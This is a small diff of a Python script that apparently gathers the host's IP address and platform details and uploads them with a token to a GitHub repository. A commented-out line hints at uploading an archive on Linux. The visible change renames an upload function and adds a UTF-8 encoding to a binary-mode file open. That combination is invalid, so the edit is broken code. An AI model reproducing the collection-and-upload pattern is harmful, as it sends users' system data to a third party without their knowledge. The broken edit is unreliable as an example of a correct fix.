@@ -18,8 +18,8 @@ def create_file(file_path, content):
 def delete_file(file_path):
     os.remove(file_path)
 
-def upload_File(filename,token):
-    with open(filename, "rb") as f:      
+def upload_file(filename,token):
+    with open(filename, "rb", encoding="utf-8") as f:      
 	# Encoding 
     urls='https://api.github.com/repos/kaki714/Not/contents/data/<filename>'
     url=urls.replace('<filename>', filename)
@@ -57,7 +57,7 @@ def run(token):
     stmnt= 'Info: '+ IPAddr+' System:'+sysconfig.get_platform()
     print(stmnt)
     create_file(fname,stmnt)
-    upload_File(fname,token)
+    upload_file(fname,token)
     
     if "Linux" in platform.system():
         #upload_file_to_github(archive)
